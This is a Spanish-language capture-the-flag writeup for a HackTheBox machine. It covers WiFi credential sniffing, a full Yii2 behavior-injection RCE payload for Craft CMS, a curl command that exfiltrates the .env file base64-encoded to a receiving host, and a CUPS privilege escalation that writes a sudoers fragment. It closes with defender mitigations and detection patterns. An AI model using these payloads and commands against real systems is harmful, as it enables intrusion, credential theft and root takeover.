# Layover — HTB Writeup
**Dificultad:** Medium  
**OS:** Linux  
**Autor:** Vortek Offensive  
**Fecha:** 2026-09-26

---

## Resumen Ejecutivo

Layover es una máquina Medium Linux que simula un entorno corporativo de aeropuerto con una red WiFi interna. El acceso inicial llega por RDP a un jumpbox, desde donde se conecta a una red WiFi simulada (mac80211_hwsim) para capturar credenciales de un usuario en texto claro via sniffing pasivo. Con esas credenciales se explota una vulnerabilidad de inyección de comportamiento en Craft CMS 5.9.8 que permite RCE sin ser administrador. El movimiento lateral requiere descifrar una contraseña cifrada con la clave de seguridad del CMS. La escalada a root se consigue abusando de CVE-2026-34990, una vulnerabilidad en CUPS 2.4.16 que permite a cualquier usuario local capturar un token de autenticación del demonio de impresión y usarlo para escribir archivos arbitrarios como root — en este caso, un fragmento de sudoers.

---

## 1. Reconocimiento

**Objetivo de esta fase:** Determinar qué servicios están expuestos en el target para priorizar vectores de ataque.

### 1.1 Puertos abiertos

El target expone únicamente dos puertos. Esto es inusual — la mayoría de máquinas HTB tienen más superficie — y es un hint de que el acceso inicial no va por la vía convencional de explotar un servicio web directamente.

```
Puerto 22  — SSH (OpenSSH 9.6p1 Ubuntu)
Puerto 3389 — RDP/xrdp (no requiere NLA)
```

El puerto 3389 corresponde a **RDP** (Remote Desktop Protocol), el protocolo de escritorio remoto de Microsoft adoptado también en Linux via `xrdp`. La ausencia de **NLA** (Network Level Authentication) significa que el servidor acepta la conexión antes de pedir credenciales — esto simplifica la explotación y es considerado una misconfiguration en entornos de producción.

### 1.2 Acceso inicial via RDP

La descripción de la máquina provee credenciales iniciales: `contractor / Contractor2026!`. La autenticación SSH con estas credenciales falla porque `sshd` tiene deshabilitada la autenticación por contraseña para este usuario. El acceso correcto es via RDP:

```bash
rdesktop -u contractor -p 'Contractor2026!' -g 1280x1024 <IP>
```

**rdesktop** es un cliente RDP open source para Linux. Al conectar, se obtiene un escritorio XFCE del sistema `airside-ws01`, que resulta ser un contenedor LXD (identificable por la interfaz `eth0@if11`, que indica una interfaz virtual de red dentro de un namespace).

Una vez dentro, la escalada a root local es inmediata:

```bash
sudo bash
# Password: Contractor2026!
```

El usuario `contractor` pertenece al grupo `sudo`, lo que permite ejecutar cualquier comando como root. Este jumpbox es intencionalmente débil — su propósito narrativo es ser un punto de pivoting, no el objetivo final.

---

## 2. Enumeración de Red Interna

### 2.1 Interfaces de red y WiFi simulado

Siendo root en `airside-ws01`, la enumeración de interfaces revela algo no convencional:

```bash
ip a
```

```
6: wlan2: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 ...
7: wlan3: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 ...
10: eth0@if11: ... inet 10.159.143.45/24
```

Hay dos interfaces WiFi (`wlan2`, `wlan3`) inactivas. El driver detrás de estas interfaces es `mac80211_hwsim` — un módulo del kernel de Linux que simula hardware WiFi para pruebas, permitiendo crear redes WiFi completamente virtuales con comportamiento real (beacons, autenticación, transmisión de frames).

Un scan revela la red disponible:

```bash
iw dev wlan2 scan 2>/dev/null | grep SSID
# SSID: HTB International WiFi
```

La red no tiene contraseña (`key_mgmt: NONE`), lo cual es el estado original del challenge. Conectar a ella asigna una IP en la subnet `10.13.37.0/24`:

```bash
nmcli dev wifi connect "HTB International WiFi" ifname wlan2
# ip: 10.13.37.182/24
```

### 2.2 Captura de credenciales en tráfico WiFi

Con `wlan3` en **modo monitor** (captura todo el tráfico del medio sin necesidad de estar asociado a la red) y configurada en el **canal 6** (donde está el AP según el scan), se puede ver el tráfico de otros clientes en la misma red WiFi:

```bash
ip link set wlan3 down
iw dev wlan3 set type monitor
ip link set wlan3 up
iw dev wlan3 set channel 6

tshark -i wlan3 \
  -Y 'http.request.method=="POST"' \
  -T fields \
  -e ip.src \
  -e http.request.full_uri \
  -e urlencoded-form.key \
  -e urlencoded-form.value
```

**tshark** es la versión de línea de comandos de Wireshark — un analizador de protocolos de red. El flag `-Y` aplica un filtro de visualización que solo muestra peticiones HTTP POST. Esto es posible porque la red WiFi no tiene cifrado (WPA/WPA2), por lo que todos los frames son visibles en texto claro para cualquiera en modo monitor.

Resultado capturado:

```
10.13.37.132    http://portal.international.htb/miles/login.php    username,password    jenny,Fl1ghtDeck2026!
```

Un bot (simulando el comportamiento de un empleado) hace login al portal del aeropuerto periódicamente con credenciales en texto claro sobre HTTP sin TLS. Las credenciales son: `jenny / Fl1ghtDeck2026!`.

El servidor del portal está en `10.13.37.10`. Se agrega al `/etc/hosts`:

```bash
echo "10.13.37.10 portal.international.htb" >> /etc/hosts
```

---

## 3. Foothold — RCE en Craft CMS

### 3.1 Reconocimiento del portal

`http://portal.international.htb` aloja **Craft CMS 5.9.8**, un CMS (Content Management System) orientado a empresas, construido en PHP sobre el framework Yii2. El panel de administración está en `/admin`.

Las credenciales de Jenny permiten autenticarse en el panel admin, pero con privilegios limitados (`userIsAdmin: false`). La configuración `allowAdminChanges: false` bloquea los vectores más obvios de SSTI (inyección en Title Format de Entry Types).

### 3.2 La vulnerabilidad — Inyección de comportamiento Yii2

El endpoint `/index.php?p=admin/actions/element-search/search` acepta una estructura JSON que define condiciones de búsqueda de elementos en Craft. Dentro de esta estructura se pueden definir `fieldLayouts` con un array `as rce` que especifica behaviors de Yii2.

**Yii2** es el framework PHP sobre el que está construido Craft CMS. Los **behaviors** en Yii2 son clases que extienden la funcionalidad de un componente en tiempo de ejecución — una forma de composición en lugar de herencia. El problema: el endpoint no valida qué clase de behavior se instancia ni qué métodos invoca.

La clase `Psy\Readline\Hoa\ConsoleProcessus` es parte de PsySH (un REPL de PHP), que a su vez usa `Hoa\Console` para ejecutar procesos del sistema. El método `execute` acepta un comando como string o array y lo ejecuta.

El payload completo:

```python
payload = {
    "elementType": "craft\\elements\\Category",
    "siteId": 1,
    "search": "",
    "condition": {
        "class": "craft\\elements\\conditions\\ElementCondition",
        "elementType": "craft\\elements\\Category",
        "fieldLayouts": [{
            "as rce": {
                "__class": "yii\\behaviors\\AttributeTypecastBehavior",
                "__construct()": [{
                    "attributeTypes": {
                        "typecastBeforeSave": [
                            "Psy\\Readline\\Hoa\\ConsoleProcessus",
                            "execute"
                        ]
                    },
                    "typecastBeforeSave": ["sh", "-c", "<COMANDO>"]
                }]
            },
            "on *": "self::beforeSave"
        }]
    },
    "CRAFT_CSRF_TOKEN": csrf2
}
```

El comando se pasa como array para que `ConsoleProcessus` lo ejecute via `exec()` de PHP sin pasar por un shell, lo que evita problemas de escape de caracteres especiales.

### 3.3 Exfiltración de datos via HTTP

Dado que el output del comando no aparece en la respuesta JSON, se exfiltra via petición HTTP al jumpbox (que actúa como receptor):

```python
# En el jumpbox — servidor HTTP receptor
import http.server, threading, urllib.parse, base64

# El comando en el servidor remoto
cmd = ["sh", "-c", "curl -s http://10.13.37.182:9999/$(cat /var/www/portal/.env | base64 -w0)"]
```

El servidor remoto (`10.13.37.10`) ejecuta `curl` con el output del comando codificado en base64 como path de la URL. El jumpbox recibe la petición y decodifica el path.

### 3.4 Obtención del `.env` y descifrado de credenciales

El archivo `/var/www/portal/.env` contiene la clave de seguridad del CMS:

```
CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
```

En el backup SQL del CMS (obtenido via el panel de Database Backup al que Jenny tiene acceso) existe la tabla `htbairways_settings` con una contraseña cifrada:

```
mailRelayPassword = u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0...
mailRelayUser     = aporter
```

**Craft CMS** cifra datos sensibles usando su `Security::encryptByKey()`, que internamente usa AES-256-GCM con derivación de clave via HKDF. El descifrado requiere la `CRAFT_SECURITY_KEY`:

```bash
# En el servidor del CMS (via RCE o shell)
cd /var/www/portal
php -r "
require 'vendor/autoload.php';
\$security = new \yii\base\Security();
echo \$security->decryptByKey(
    base64_decode('u0E7OgbBeWhhPn1HajsFMDg...'),
    'IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr'
);
"
# Output: Skyp0rt_Relay!26
```

---

## 4. Movimiento Lateral — SSH como aporter

Con las credenciales descifradas (`aporter / Skyp0rt_Relay!26`) se obtiene acceso SSH directo al servidor del CMS desde el jumpbox:

```bash
sshpass -p 'Skyp0rt_Relay!26' ssh -o StrictHostKeyChecking=no aporter@10.13.37.10
```

```
aporter@portal:~$ cat user.txt
04eb9d0058a80fa297137fbf4741f0ce
```

El usuario `aporter` no tiene acceso `sudo` ni pertenece a grupos privilegiados. La enumeración post-acceso identifica que `cupsd` (el demonio de CUPS) está corriendo como root en `localhost:631`.

---

## 5. Escalada de Privilegios — CVE-2026-34990 (CUPS 2.4.16)

### 5.1 ¿Qué es CUPS?

**CUPS** (Common Unix Printing System) es el sistema de impresión estándar en Linux y macOS. El demonio `cupsd` gestiona impresoras, colas de impresión y trabajos. Corre como root porque necesita acceso directo a dispositivos de hardware y escritura en directorios del sistema.

### 5.2 La vulnerabilidad

**CVE-2026-34990** afecta específicamente a CUPS 2.4.16. El sistema tiene dos mecanismos de autenticación relevantes:

1. **CUPS-Create-Local-Printer**: Una operación IPP que crea una impresora temporal. Por diseño, **no requiere autenticación de administrador** — cualquier usuario local puede invocarla. La impresora creada apunta a un `device-uri` que puede ser una URL IPP.

2. **Token `Authorization: Local`**: Cuando `cupsd` necesita validar una impresora temporal contra el `device-uri` especificado, hace una conexión IPP saliente a esa URI. Si la URI apunta a un servicio en localhost que responde con `WWW-Authenticate: Local trc="y"`, cupsd responde incluyendo su token de autenticación local en el header `Authorization: Local <TOKEN>`.

3. **El token es reutilizable**: Cualquier petición a `/admin/` en localhost que incluya ese token es aceptada como autenticada con permisos de administrador de CUPS.

4. **File:// bypass**: La ruta normal de CUPS rechaza URIs `file://` en impresoras persistentes (la política `FileDevice` lo bloquea). El bypass es crear primero una impresora temporal con el URI `file:///ruta/archivo` y luego hacerla permanente usando `OP_ADD_MODIFY_PRINTER` con `printer-is-temporary=false` sin re-especificar el `device-uri` — en este punto ya no se valida la política.

5. **Escritura arbitraria como root**: Al imprimir un trabajo en esa impresora, `cupsd` abre el archivo destino con `O_WRONLY|O_CREAT|O_TRUNC` corriendo como root, escribiendo el contenido del job.

### 5.3 Cadena de explotación

```
Usuario local sin privilegios
    ↓ CUPS-Create-Local-Printer → impresora temporal con device-uri=ipp://localhost:9189/
    ↓ cupsd conecta a 9189 para validar
    ↓ Servidor captura Authorization: Local <TOKEN>
    ↓ Con TOKEN → OP_ADD_MODIFY_PRINTER → impresora permanente con file:///etc/sudoers.d/aporter-pwn
    ↓ Print-Job → cupsd escribe como root el contenido del job
    ↓ Contenido: "aporter ALL=(ALL) NOPASSWD: ALL"
    ↓ sudo -n bash → root
```

### 5.4 Ejecución

```bash
python3 /tmp/cups_root.py
```

```
[+] Local token: 8A8B4991E5C14CEA069BA9824C9C85FB
[*] step 1: write sudoers fragment
    [sw] queue add 0x0000 / print HTTP 200 0x0000
    [sw] queue add 0x0000 / print HTTP 200 0x0000
    [...]
[*] sudo -n id -> rc_ok=True :: uid=0(root) gid=0(root) groups=0(root)
[+] ROOT via sudoers
```

```bash
sudo cat /root/root.txt
# fa8b0a8cbb1d1100efe369bc89196c5a
```

---

## 6. Rabbit Holes

**SSH con las credenciales de contractor** — El servidor solo acepta autenticación por llave pública para SSH. Intentar autenticarse por contraseña siempre falla con `Permission denied (publickey,password)`. El acceso inicial correcto es RDP.

**Crackear el hash bcrypt del admin de Craft** — El hash del administrador (`$2y$13$ZdTZwteklJx...`) con bcrypt cost factor 13 tardaría aproximadamente 8 días en una CPU de doce núcleos contra rockyou.txt. No es el camino. Las credenciales necesarias se obtienen descifrando el `mailRelayPassword` con la `CRAFT_SECURITY_KEY`.

**CVE-2024-47176 (cups-browsed)** — Esta variante del ataque a CUPS requiere el demonio `cups-browsed` corriendo, que escucha por UDP en el puerto 631. En este sistema, `cups-browsed` no está instalado. Solo corre `cupsd`.

**Reverse shell directa** — El servidor `10.13.37.10` no tiene salida directa a la IP del atacante en `tun0`. Solo puede conectar al jumpbox en `10.13.37.182`. Los intentos de reverse shell hacia la IP de HTB fallan silenciosamente.

---

## 7. Lecciones para Defenders

**Red WiFi sin cifrado**
El sniffing fue posible porque la red no usa WPA2/WPA3. Cualquier cliente en modo monitor puede capturar todo el tráfico. La autenticación HTTP sin TLS sobre esta red expone credenciales en texto claro.
- Mitigación: WPA3-Enterprise con certificados; TLS obligatorio en todas las aplicaciones internas aunque la red sea "corporativa".
- Detección: Monitorear clientes en modo monitor via 802.11 management frames (Probe Requests con capabilities que indican monitor mode, ausencia de Association Requests).

**Inyección de comportamiento en Craft CMS**
El endpoint `element-search/search` acepta clases PHP arbitrarias en la definición de condiciones sin sanitizar. Esto no requiere ser administrador — cualquier usuario con acceso al panel admin puede explotarlo.
- Mitigación: Actualizar a Craft CMS 5.9.9+ donde se limita la instanciación de clases en contextos de búsqueda.
- Detección: Alertas en el WAF para requests a `/admin/actions/element-search/search` con payloads que contengan `__class`, `ConsoleProcessus` o `AttributeTypecastBehavior`.

**Contraseña de relay SMTP cifrada pero recuperable**
El cifrado de la contraseña en la base de datos está bien implementado, pero la clave de descifrado (`CRAFT_SECURITY_KEY`) vive en un archivo `.env` en el mismo servidor. Un atacante con RCE puede leer ambos y reconstruir la credencial.
- Mitigación: Separar la gestión de secretos del servidor de aplicación (HashiCorp Vault, AWS Secrets Manager). El servidor de aplicación obtiene el secreto en tiempo de ejecución sin que quede en disco.

**CUPS 2.4.16 — escritura arbitraria como root**
La operación `CUPS-Create-Local-Printer` no requiere autenticación admin y permite crear impresoras con URIs arbitrarios, incluidos `file://`. El token de autenticación local de CUPS es captu-rable por cualquier proceso local.
- Mitigación: Actualizar a CUPS 2.4.17+ donde se eliminó el soporte para `file://` en colas de impresión y se restringe el uso de certificados locales sobre la interfaz de loopback.
- Detección: Monitorear conexiones salientes desde `cupsd` a puertos no estándar en localhost; alertar sobre escrituras en `/etc/sudoers.d/` y `/etc/cron.d/` por parte del proceso `cupsd`.

---

## 8. TTPs (MITRE ATT&CK)

| ID | Técnica | Cómo se usó |
|----|---------|-------------|
| T1021.001 | Remote Services: Remote Desktop Protocol | Acceso inicial al jumpbox via RDP con credenciales provistas |
| T1078 | Valid Accounts | Uso de credenciales de contractor para acceso inicial |
| T1040 | Network Sniffing | Captura de credenciales de Jenny via tshark en wlan3 en modo monitor |
| T1190 | Exploit Public-Facing Application | RCE en Craft CMS via inyección de behavior Yii2 |
| T1552.001 | Unsecured Credentials: Credentials In Files | Lectura de CRAFT_SECURITY_KEY del .env |
| T1140 | Deobfuscate/Decode Files or Information | Descifrado de mailRelayPassword con la security key de Craft |
| T1068 | Exploitation for Privilege Escalation | CVE-2026-34990 en CUPS 2.4.16 para escritura arbitraria como root |
| T1548.003 | Abuse Elevation Control Mechanism: Sudo and Sudo Caching | Escritura de fragmento sudoers via CUPS para obtener sudo sin contraseña |

---

*Vortek Offensive — vortekoffensive.com*
